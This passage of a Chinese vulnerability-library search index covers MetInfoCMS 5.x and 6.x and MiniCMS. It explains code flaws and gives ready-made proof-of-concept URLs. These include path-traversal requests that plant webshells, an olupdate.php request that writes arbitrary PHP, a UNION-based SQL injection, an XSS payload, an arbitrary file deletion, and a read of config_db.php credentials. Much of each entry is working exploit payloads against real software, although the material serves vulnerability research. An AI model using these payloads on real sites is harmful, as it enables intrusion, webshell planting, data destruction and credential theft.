\u6f0f\u6d1e\u5206\u6790","text":"<p>5.3.19\u7248\u672c\u9488\u5bf9CVE-2017-11347\u7684\u8865\u4e01\u5206\u6790</p> <pre><code>switch($val[2]){\n   case 1:\n      $address=\"../about/$fileaddr[1]\";\n   break;\n   case 2:\n      $address=\"../news/$fileaddr[1]\";\n   break;\n   case 3:\n      $address=\"../product/$fileaddr[1]\";\n   break;\n   case 4:\n      $address=\"../download/$fileaddr[1]\";\n   break;\n   case 5:\n      $address=\"../img/$fileaddr[1]\";\n   break;\n   case 8:\n      $address=\"../feedback/$fileaddr[1]\";\n   break;\n   default:\n      $address = \"\";\n   break;\n\n}   \n   $newfile  =\"../../../$val[1]\"; \n   if($address != ''){\n      Copyfile($address,$newfile);\n   }\n\n}\n}\n</code></pre> <p>\u5373\uff1a5.3.19\u7248\u672c\u91c7\u53d6\uff1a\u5373\u4f7f\u5728\\(var[2]\u4e3a\u7a7a\u65f6\uff0c\u9ed8\u8ba4\u7ed9address\u53d8\u91cf\u8d4b\u503c\u4e3a\u7a7a\uff0c\u5e76\u4e14\u4f1a\u5224\u65adaddress\u53c2\u6570\u4e0d\u4e3a\u7a7a\u624d\u8c03\u7528Copyfile\u3002\u4f46\u662f\u5f53\\)var[2]\u4e0d\u4e3a\u7a7a\u65f6\uff0c\u7531\u4e8efileaddr[1]\u53ef\u63a7\u5bfc\u81f4\uff0c\u4ecd\u7136\u53ef\u4ee5\u63a7\u5236\u6587\u4ef6\u8def\u5f84\u4ece\u800cGetshell\u3002</p> <p>\u6f0f\u6d1e\u5229\u7528(\u7f51\u7ad9\u5b89\u88c5\u5728\u670d\u52a1\u5668\u6839\u8def\u5f84\u7684\u60c5\u51b5)\uff1a</p> <p>\u7b2c\u4e00\u6b65\uff0c\u65b0\u5efa1.ico\u6587\u4ef6\uff0c\u5185\u5bb9\u4e3a\uff1a&lt;?php phpinfo();?&gt; \u5728\u540e\u53f0\"\u5730\u5740\u680f\u56fe\u6807\"\u5904\u4e0a\u4f20\u8be5\u6587\u4ef6\u3002 \u5f97\u5230\u5730\u5740\u4e3a\uff1ahttp://localhost/upload/file/1506587082.ico</p> <p>\u7b2c\u4e8c\u6b65\uff0c\u53d1\u9001\u5982\u4e0bpayload(\u6ce8\u610f\u5de6\u659c\u6760\u548c\u53f3\u659c\u6760\u4e0d\u80fd\u968f\u610f\u66f4\u6539):</p> <pre><code>http://localhost/admin/app/physical/physical.php?action=op&amp;op=3&amp;valphy=test|/..\\upload\\file\\1506587082.ico/..\\..\\..\\www\\about\\shell.php|1\n</code></pre> <p>shell\u7684\u5730\u5740\u4e3a\uff1a</p> <pre><code>http://localhost/about/shell.php\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/MetinfoCMS/MetInfoCMS%205.X%E7%89%88%E6%9C%ACGETSHELL%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/#3-poc_1","title":"3. POC(\u6ce8\u610f\u5de6\u659c\u6760\u548c\u53f3\u659c\u6760\u4e0d\u80fd\u968f\u610f\u66f4\u6539)\uff1a","text":"<pre><code>http://localhost/admin/app/physical/physical.php?action=op&amp;op=3&amp;valphy=test|/..\\\u4e0a\u4f20ico\u6587\u4ef6\u7684\u76f8\u5bf9\u8def\u5f84/..\\..\\..\\\u7f51\u7ad9index.php\u8def\u5f84\u7684\u4e0a\u4e00\u5c42\u76ee\u5f55\u540d\\about\\webshell\u7684\u6587\u4ef6\u540d|1\n</code></pre> <p>\u7279\u522b\u6ce8\u610f\u5176\u4e2d\u7684\uff1a\u201c\u7f51\u7ad9index.php\u4e0a\u5c42\u76ee\u5f55\u540d\u201d\uff0c</p> <p>1.\u5982\u679c\u7f51\u7ad9\u5b89\u88c5\u5728\u670d\u52a1\u5668\u6839\u76ee\u5f55\uff0c\u8fd9wamp/phpstudy\u9ed8\u8ba4\u76ee\u5f55\u503c\u4e3a\u201cwww\"\uff1b\u7f51\u7ad9index.php\u4e0a\u5c42\u76ee\u5f55\u540d\u8bbe\u7f6e\u4e3a\"www\"; \u5982\u679c\u4e3alamp\u73af\u5883\uff0c\u8fd9\u9ed8\u8ba4\u76ee\u5f55\u503c\u4e3a\u201chtml\u201d\u7f51\u7ad9index.php\u4e0a\u5c42\u76ee\u5f55\u540d\u8bbe\u7f6e\u4e3a\"html\";\u3002\u5176\u4ed6\u7684\u73af\u5883\u7c7b\u63a8\uff08\u5229\u7528\u7edd\u5bf9\u8def\u5f84\u6cc4\u9732\uff09\u3002</p> <p>2.\u5982\u679c\u7f51\u7ad9\u5b89\u88c5\u5728\u670d\u52a1\u5668\u7684\u4e8c\u7ea7\u76ee\u5f55\u4e0b\uff0c\u5219\u7f51\u7ad9index.php\u4e0a\u5c42\u76ee\u5f55\u540d\u8bbe\u7f6e\u4e3a\u4e8c\u7ea7\u76ee\u5f55\u540d\u3002</p> <p>\u4f8b\u5982:\u7f51\u7ad9\u642d\u5efa\u5728:http://localhost/MetInfoCMS /,\u5219\u7b2c\u4e8c\u6b65\u7684payload\u5982\u4e0b\uff1a</p> <pre><code>http://localhost/MetInfoCMS/admin/app/physical/physical.php?action=op&amp;op=3&amp;valphy=test|/..\\upload\\file\\1506588072.ico/..\\MetInfoCMS.\\MetInfoCMS \\about\\shell.php|1\n</code></pre> <p>\u76f8\u5e94\u751f\u6210\u7684shell\u5730\u5740\u4e3a\uff1a</p> <pre><code>http://localhost/MetInfoCMS/about/shell.php\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/MetinfoCMS/MetInfoCMS%205.X%E7%89%88%E6%9C%ACGETSHELL%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/#0x03-copyindxgetshell","title":"0x03 Copyindx\u51fd\u6570\u5904\u7406\u4e0d\u5f53Getshell","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/MetinfoCMS/MetInfoCMS%205.X%E7%89%88%E6%9C%ACGETSHELL%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/#1_2","title":"1. \u58f0\u660e","text":"<p>\u6b64\u6f0f\u6d1e\u70b9\u4f4d\u4e8eadmin/app/physical/physical.php\u6587\u4ef6\uff0c\u6f0f\u6d1e\u548cCVE-2017-11347\u6f0f\u6d1e\u5341\u5206\u76f8\u4f3c\uff0c\u4f46\u662f\u5b58\u5728\u6839\u672c\u7684\u5dee\u5f02\uff0c\u4e0d\u540c\u70b9\u5982\u4e0b\uff1a</p> <p>\uff081\uff09\u89e6\u53d1\u51fd\u6570\u662fCopyindex\u51fd\u6570\uff0c\u800c\u975eCopyfile</p> <p>\uff082\uff09\u6b64\u6f0f\u6d1e\u4e0d\u662f\u5229\u7528\u6587\u4ef6\u5305\u542brequire_one\uff0c\u800c\u662f\u5229\u7528\u4efb\u610f\u5185\u5bb9\u5199\u5165</p> <p>\uff083\uff09\u6b64\u6f0f\u6d1eGetshell\u4e0d\u9700\u8981\u4e0a\u4f20\u56fe\u7247</p> <p>\uff084\uff09\u7ed3\u5408CSRF\u53ef\u4ee5\u5b9e\u73b0\u4e00\u952eGetshell</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/MetinfoCMS/MetInfoCMS%205.X%E7%89%88%E6%9C%ACGETSHELL%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/#2_2","title":"2. \u6f0f\u6d1e\u70b9","text":"<pre><code># admin/app/physical/physical.php:197-236\n\nswitch($op){\n   case 1:\n   if(is_dir('../../../'.$val[1])){\n      deldir('../../../'.$val[1]);\n      echo $lang_physicaldelok;\n   }\n   else{unlink('../../../'.$val[1]);\n      echo $lang_physicaldelok;\n      }\n   break;\n   case 2:\n      $adminfile=$url_array[count($url_array)-2];\n      $strsvalto=readmin($val[1],$adminfile,1);\n      filetest('../../../'.$val[1]);\n      deldir('../../../'.$val[1]);\n      $dlappfile=parse_ini_file('dlappfile.php',true);\n      if($dlappfile[$strsvalto]['dlfile']){\n         $return=varcodeb('app');\n         $checksum=$return['md5'];\n         $met_file='/dl/app_curl.php';\n         $stringfile=dlfile($dlappfile[$strsvalto]['dlfile'],\"../../../$val[1]\");\n      }else{\n         $met_file='/dl/olupdate_curl.php';\n         $stringfile=dlfile(\"v$metcms_v/$strsvalto\",\"../../../$val[1]\");\n      }\n      if($stringfile==1){\n         echo $lang_physicalupdatesuc;\n      }\n      else{\n         echo dlerror($stringfile);\n         die();\n      }\n   break;\n   case 3:\n      $fileaddr=explode('/',$val[1]);\n      $filedir=\"../../../\".$fileaddr[0];  \n      if(!file_exists($filedir)){ @mkdir ($filedir, 0777); } \n      if($fileaddr[1]==\"index.php\"){\n         Copyindx(\"../../../\".$val[1],$val[2]);\n      }\n</code></pre> <p>\u5f53\\(action\u7b49\u4e8eop\u800c\u4e14\\)op\u7b49\u4e8e3\u7684\u65f6\u5019\uff0c\u5982\u679c\\(filedir\u4e0d\u5b58\u5728\u5219\u521b\u5efa\\)filedir\u76ee\u5f55\uff0c\u800c\u4e14\u5982\u679c\\(fileaddr[1]\u7b49\u4e8e\"index.php\"\u5219\u8c03\u7528Copyindex\u51fd\u6570\uff0c\u5e76\u4f20\u5165\\)val[1]\u548c\\(val[2]\u53c2\u6570\uff0c\u6b64\u5904\u4e24\u4e2a\u53c2\u6570\u6765\u81ea\u53d8\u91cf\\)valphy,\u5747\u53ef\u63a7\uff01\uff01\u8ddf\u8fdbCopyindex\u51fd\u6570\u6e90\u7801\u5982\u4e0b\uff1a</p> <pre><code>#admin/include/global.func.php:877-884\n\nfunction Copyindx($newindx,$type){\n   if(!file_exists($newindx)){\n      $oldcont =\"&lt;?php\\n# xxx Enterprise Content Management System \\n# Copyright (C) xxx Co.,Ltd (http://www.xxx.cn). All rights reserved. \\n\\$filpy = basename(dirname(__FILE__));\\n\\$fmodule=$type;\\nrequire_once '../include/module.php'; \\nrequire_once \\$module; \\n# This program is an open source system, commercial use, please consciously to purchase commercial license.\\n# Copyright (C) xxx Co., Ltd. (http://www.xxx.cn). All rights reserved.\\n?&gt;\";\n      $fp = fopen($newindx,w);\n      fputs($fp, $oldcont);\n      fclose($fp);\n   }\n}\n</code></pre> <p>\u53ef\u89c1\uff0c\u76f4\u63a5\u628a\u53c2\u6570\\(type\u76f4\u63a5\u8d4b\u503c\u7ed9\\)fmodule,\u5e76\u5199\u5165\u6587\u4ef6\u5185\u5bb9\uff0c\u6240\u4ee5\u53ef\u4ee5\u6784\u9020payload\u76f4\u63a5getshell.</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/MetinfoCMS/MetInfoCMS%205.X%E7%89%88%E6%9C%ACGETSHELL%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/#3-pocxxxshellindexphp","title":"3. POC(xxx\u4e3a\u4efb\u610f\u7684shell\u76ee\u5f55\uff0cindex.php\u6587\u4ef6\u540d\u4e0d\u80fd\u4fee\u6539)","text":"<p>\u751f\u6210\u7684shell\u5730\u5740\uff1a</p> <pre><code>http://localhost/MetInfoCMS/xxx/index.php\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/MetinfoCMS/MetInfoCMS%205.X%E7%89%88%E6%9C%ACGETSHELL%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/#0x04-olupdategetshell","title":"0x04 olupdate\u6587\u4ef6\u7f3a\u9677\u5bfc\u81f4Getshell","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/MetinfoCMS/MetInfoCMS%205.X%E7%89%88%E6%9C%ACGETSHELL%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/#1_3","title":"1. \u6f0f\u6d1e\u70b9","text":"<pre><code>#/admin/system/olupdate.phpwen\u6587\u4ef6\u4e2d\uff0c\u5f53$action=sql,$sql!=No Date\u4e14$sqlfile\u4e0d\u662f\u6570\u7ec4\u65f6\u8fdb\u5165\u5982\u4e0b\u8fc7\u7a0b\n\n#326-360\u884c\n$num=1;\n$random = met_rand(6);\n$date=date('Ymd',time());\nrequire_once '../system/database/global.func.php';\ndo{\n    $sqldump = '';\n    $startrow = '';\n    $tables=tableprearray($tablepre);\n    $sizelimit=2048;\n    $tableid = isset($tableid) ? $tableid - 1 : 0;\n    $startfrom = isset($startfrom) ? intval($startfrom) : 0;\n    $tablenumber = count($tables);\n    for($i = $tableid; $i &lt; $tablenumber &amp;&amp; strlen($sqldump) &lt; $sizelimit * 1000; $i++){\n        $sqldump .= sql_dumptable($tables[$i], $startfrom, strlen($sqldump));\n        $startfrom = 0;\n    }\n    $startfrom = $startrow;\n    $tableid = $i;\n    if(trim($sqldump)){\n        $sqlfile[]=$bakfile = \"../update/$addr/{$con_db_name}_{$date}_{$random}_{$num}.sql\";\n        $version='version:'.$metcms_v;\n        $sqldump = \"#xxx.cn Created {$version} \\n#{$met_weburl}\\n#{$tablepre}\\n#{$met_webkeys}\\n# --------------------------------------------------------\\n\\n\\n\".$sqldump;\n        if(!file_put_contents($bakfile, $sqldump)){\n            dl_error($lang_updaterr2.\"({$adminfile}/update/$addr/{$con_db_name}_{$date}_{$random}_{$num}.sql)\",$type,$olid,$ver,$addr,$action);\n        }\n    }\n    $num++;\n}\nwhile(trim($sqldump));\nif(is_array($sqlfile)) $string = \"&lt;?php\\n \\$sqlfile = \".var_export($sqlfile, true).\"; ?&gt;\";\nfiletest(\"../update/$addr/sqlist.php\");\nif(!file_put_contents(\"../update/$addr/sqlist.php\",$string)){\n    dl_error($lang_updaterr2.\"({$adminfile}/update/$addr/sqlist.php)\",$type,$olid,$ver,$addr,$action);\n}\n</code></pre> <p>\u6b64\u65f6\u7531\u4e8esqlfile\u4e0d\u662f\u6570\u7ec4\uff0c\u5373is_array(\\(sqlfile)\u4e0d\u6210\u7acb\uff0c\u5bfc\u81f4\\)string\u6ca1\u6709\u521d\u59cb\u5316\uff0c\u53ef\u4ee5\u4efb\u610f\u4fee\u6539\uff0c\u63a5\u7740\u8c03\u7528file_put_contents\u5c06string\u7684\u503c\u5199\u5230/update/$addr/sqlist.php\u6587\u4ef6\u3002</p> <p>PS:\u8fd9\u91cc\u6709\u4e00\u4e2a\u5c0f\u70b9,\u7531\u4e8e\u8f93\u5165\u63a7\u5236sqlfile\u4e0d\u662f\u6570\u7ec4\uff0c\u7b2c345\u884c\u6267\u884c\\(sqlfile[]=\\)bakfile = \"../update/\\(addr/{\\)con_dbname}{\\(date}{\\)random}{\\(num}.sql\";\u4f1a\u5bfc\u81f4\u7ed9\u5b57\u7b26\u4e32\u8d4b\u503c\u62a5\u9519\uff0c\u5bfc\u81f4\u65e0\u6cd5\u6267\u884c\u5230\u540e\u9762\u7684Getshell\u90e8\u5206\u3002\u6240\u4ee5\u9700\u8981\u6784\u9020payload\u4f7f\u5f97trim(\\)sqldump)\u4e3a\u7a7a\uff0c\u5373\\(sqldump\u503c\u4e3a\u7a7a\uff0c\u4ece\u800c\u8df3\u8fc7\\)sqlfile[]\u8d4b\u503c\u90e8\u5206\uff0c\u8fd9\u91cc\u6784\u9020tableid=1000(\u5176\u5b9e\u53ea\u8981&gt;=44\u5373\u53ef)</p> <p>\u6700\u540e\u7684payload\u7ed3\u6784\u5982\u4e0b\uff1a</p> <pre><code>/admin/system/olupdate.php?action=sql&amp;sqlfile=1&amp;string=shell\u5185\u5bb9&amp;addr=shell\u7684\u76ee\u5f55&amp;tableid=1000\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/MetinfoCMS/MetInfoCMS%205.X%E7%89%88%E6%9C%ACGETSHELL%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/#2poc-addrshellshellsqlistphp","title":"2.POC (\u53c2\u6570addr\u4e3a\u751f\u6210shell\u7684\u76ee\u5f55\uff0c\u751f\u6210shell\u7684\u6587\u4ef6\u540dsqlist.php\u4e0d\u53ef\u63a7)","text":"<pre><code>http://xxx.com/admin/system/olupdate.php?action=sql&amp;sqlfile=1&amp;string=&lt;?php phpinfo();?&gt;&amp;addr=12313&amp;tableid=1000\n</code></pre> <p>\u6267\u884c\u540e\u7684shell\u5730\u5740\uff1a</p> <pre><code>http://xxx.com/admin/update/12313/sqlist.php\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/MetinfoCMS/MetInfoCMS%205.X%E7%89%88%E6%9C%ACGETSHELL%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/#0x05","title":"0x05\u5c0f\u7ed3","text":"<p>\u90fd\u662f\u9700\u8981\u540e\u53f0\u7ba1\u7406\u5458\u6743\u9650\u624d\u80fd\u5229\u7528\u7684\u6f0f\u6d1e\uff0c\u4e0d\u8fc7\u5371\u5bb3\u8fd8\u662f\u6bd4\u8f83\u5927\uff0c\u6ca1\u6709\u5347\u7ea7\u7684\u7f51\u7ad9\u8d76\u7d27\u5347\u7ea76.0\u7248\u672c\u54e6\uff01 \u524d\u51e0\u4e2a\u90fd\u6709\u4e00\u5b9a\u7684\u6761\u4ef6\u8981\u6c42\uff0c\u540e\u9762\u4e24\u4e2a\u6bd4\u8f83\u901a\u6740!</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/MetinfoCMS/Metinfo-6.1.2%E7%89%88%E6%9C%AC%E5%AD%98%E5%9C%A8XSS%E6%BC%8F%E6%B4%9E%26SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","title":"Metinfo 6.1.2\u7248\u672c\u5b58\u5728XSS\u6f0f\u6d1e&SQL\u6ce8\u5165\u6f0f\u6d1e","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/MetinfoCMS/Metinfo-6.1.2%E7%89%88%E6%9C%AC%E5%AD%98%E5%9C%A8XSS%E6%BC%8F%E6%B4%9E%26SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_1","title":"\u6f0f\u6d1e\u7b80\u4ecb","text":"\u6f0f\u6d1e\u540d\u79f0 \u4e0a\u62a5\u65e5\u671f \u6f0f\u6d1e\u53d1\u73b0\u8005 \u4ea7\u54c1\u9996\u9875 \u8f6f\u4ef6\u94fe\u63a5 \u7248\u672c CVE\u7f16\u53f7 Metinfo-6.1.2\u7248\u672c\u5b58\u5728XSS\u6f0f\u6d1e&amp;SQL\u6ce8\u5165\u6f0f\u6d1e 2018-10-12 \u8e0f\u6708\u7559\u9999 https://www.metinfo.cn/ \u4e0b\u8f7d\u5730\u5740 6.1.2 CVE-2018-18296/CVE-2018-17129"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/MetinfoCMS/Metinfo-6.1.2%E7%89%88%E6%9C%AC%E5%AD%98%E5%9C%A8XSS%E6%BC%8F%E6%B4%9E%26SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_2","title":"\u6f0f\u6d1e\u6982\u8ff0","text":"<p>\u6f0f\u6d1e\u5b58\u5728\u4e8eMetInfo6.1.2/admin/index.php\u9875\u9762\uff0c\u7531\u4e8e\u53c2\u6570bigclass\u8fc7\u6ee4\u4e0d\u4e25\uff0c\u5bfc\u81f4XSS\u6f0f\u6d1e \u672c\u5730\u642d\u5efa\u7f51\u7ad9\uff0c\u9996\u5148\u767b\u5f55\u7f51\u7ad9\u540e\u53f0:<code>http://172.16.141.134/MetInfo6.1.2/admin/</code>\uff0c\u767b\u5f55\u6210\u529f\u540e\uff0c\u6784\u9020payload\uff1a <code>http://172.16.141.134/MetInfo6.1.2/admin/index.php?lang=cn&amp;anyid=25&amp;n=column&amp;c=index&amp;a=doadd&amp;bigclass=1%22%3e%3cscript%3ealert(/xss/)%3c%2fscript%3e</code> \uff0c\u5373\u53ef\u6267\u884c\u8de8\u7ad9\u811a\u672c\u3002  </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/MetinfoCMS/Metinfo-6.1.2%E7%89%88%E6%9C%AC%E5%AD%98%E5%9C%A8XSS%E6%BC%8F%E6%B4%9E%26SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#poc","title":"POC\u5b9e\u73b0\u4ee3\u7801\u5982\u4e0b\uff1a","text":"<p>XSS\u6f0f\u6d1e\u7684 exp\u4ee3\u7801\u5982\u4e0b\uff1a  </p> <pre><code>http://127.0.0.1/MetInfo6.1.2/admin/index.php?lang=cn&amp;anyid=25&amp;n=column&amp;c=index&amp;a=doadd&amp;bigclass=1%22%3e%3cscript%3ealert(/xss/)%3c%2fscript%3e\n</code></pre> <p>SQL\u6ce8\u5165\u6f0f\u6d1e\u7684 exp\u4ee3\u7801\u5982\u4e0b\uff1a \u6f0f\u6d1e\u5b58\u5728\u4e8eMetInfo6.1.2 <code>/app/system/feedback/admin/feedback_admin.class.php</code>\u9875\u9762\u4e2d\uff0c\u7531\u4e8e\u8be5\u9875\u9762\u7684class1\u53c2\u6570\u8fc7\u6ee4\u4e0d\u4e25\uff0c\u5bfc\u81f4\u5b58\u5728SQL\u6ce8\u5165\u6f0f\u6d1e\u3002 \u672c\u5730\u642d\u5efa\u7f51\u7ad9\uff0c\u9996\u5148\u767b\u5f55\u7f51\u7ad9\u540e\u53f0:<code>http://172.16.141.134/MetInfo6.1.2/admin/</code>\uff0c\u767b\u5f55\u6210\u529f\u540e\uff0c\u6784\u9020payload\uff1a <code>http://172.16.141.134/MetInfo6.1.2/admin/index.php?lang=cn&amp;anyid=29&amp;n=feedback&amp;c=feedback_admin&amp;a=doexport&amp;class1=-1//union//select//concat(0x3a,user(),0x3a)//from/**/information_schema.tables&amp;met_fd_export=-1</code>\uff0c\u8bbf\u95ee\u540e\u7f51\u7ad9\u4f1a\u5bfc\u51fa\u4e00\u4e2aexcel\u8868\uff0cexcel\u8868\u7684\u540d\u79f0\u4e3a\u6570\u636e\u5e93\u7528\u6237\u540d\u3002</p> <pre><code>http://127.0.0.1/MetInfo6.1.2/admin/index.php?lang=cn&amp;anyid=29&amp;n=feedback&amp;c=feedback_admin&amp;a=doexport&amp;class1=-1/**/union/**/select/**/concat(0x3a,user(),0x3a)/**/from/**/information_schema.tables&amp;met_fd_export=-1\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/MetinfoCMS/methifo6.0.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%26%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/","title":"Methifo6.0.0\u4efb\u610f\u6587\u4ef6\u5220\u9664&\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/MetinfoCMS/methifo6.0.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%26%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/#affected-version","title":"Affected Version","text":"<p>Metinfo 6.0.0</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/MetinfoCMS/methifo6.0.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%26%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/#poc","title":"POC","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/MetinfoCMS/methifo6.0.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%26%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/#1-cms","title":"1 CMS\u5b89\u88c5\u7684\u65f6\u5019\uff0c\u6bd4\u5982\u6570\u636e\u5e93\u540d\u5b57\u4f1a\u88ab\u76f4\u63a5\u5199\u8fdb\u914d\u7f6e\u6587\u4ef6\u4e2d\u3002","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/MetinfoCMS/methifo6.0.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%26%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/#2","title":"2 \u4efb\u610f\u5220\u9664","text":"<p>\u597d\u50cf\u9700\u8981\u767b\u9646\u540e\uff0c\u624d\u80fd\u6267\u884c\u6210\u529f\u3002 admin\u76ee\u5f55\u4e0b\u3002</p> <pre><code>192.168.0.4/metinfo600/admin/app/batch/csvup.php?fileField=test-1&amp;flienamecsv=../../../config/test.txt\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/MetinfoCMS/methifo6.0.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%26%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/#3","title":"3  \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6","text":"<pre><code>metinfo600/include/thumb.php?dir=http\\..\\..\\config\\config_db.php\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/MetinfoCMS/methifo6.0.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%26%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/#references","title":"References","text":"<p>Metinfo 6.0.0 \u4f17\u591a\u6f0f\u6d1e\u5206\u6790</p> <p> MetInfo \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e\u7684\u4fee\u590d\u4e0e\u7ed5\u8fc7</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/MiniCMS/MiniCMS%201.10%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E5%A2%9E%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7/","title":"MiniCMS 1.10\u5b58\u5728CSRF\u6f0f\u6d1e\u53ef\u589e\u52a0\u7ba1\u7406\u5458\u8d26\u6237","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/MiniCMS/MiniCMS%201.10%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E5%A2%9E%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7/#_1","title":"\u6f0f\u6d1e\u7b80\u4ecb","text":"\u6f0f\u6d1e\u540d\u79f0 \u4e0a\u62a5\u65e5\u671f \u6f0f\u6d1e\u53d1\u73b0\u8005 \u4ea7\u54c1\u9996\u9875 \u8f6f\u4ef6\u94fe\u63a5 \u7248\u672c CVE\u7f16\u53f7 MiniCMS 1.10\u5b58\u5728CSRF\u6f0f\u6d1e\u53ef\u589e\u52a0\u7ba1\u7406\u5458\u8d26\u6237 2018-03-30 zixian\uff08me@zixian.org\u3001zixian@5ecurity.cn\uff09 https://github.com/bg5sbk/MiniCMS https://github.com/bg5sbk/MiniCMS 1.10 CVE-2018-9092"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/MiniCMS/MiniCMS%201.10%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E5%A2%9E%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7/#_2","title":"\u6f0f\u6d1e\u6982\u8ff0","text":"<p>MiniCMS 1.10\u5b58\u5728CSRF\u6f0f\u6d1e\uff0c\u5f53\u7ba1\u7406\u5458\u767b\u9646\u540e\u8bbf\u95ee\u4e0b\u9762CSRF\u6d4b\u8bd5\u9875\u9762\u53ef\u589e\u52a0\u7ba1\u7406\u5458\u8d26\u6237\u3002MiniCMS\u662f\u4e00\u4e2a\u5728github\u4e0a\u5f00\u6e90\u7684CMS\u7cfb\u7edf\uff0c\u6f0f\u6d1e\u53d1\u73b0\u8005\u5df2\u7ecf\u5c06\u6f0f\u6d1e\u4fe1\u606f\u901a\u8fc7issues\u544a\u77e5\u4f5c\u8005\u3002  </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/MiniCMS/MiniCMS%201.10%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E5%A2%9E%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7/#poc","title":"POC\u5b9e\u73b0\u4ee3\u7801\u5982\u4e0b\uff1a","text":"<p>CSRF\u6d4b\u8bd5\u9875\u9762\u4ee3\u7801\u5982\u4e0b\uff1a 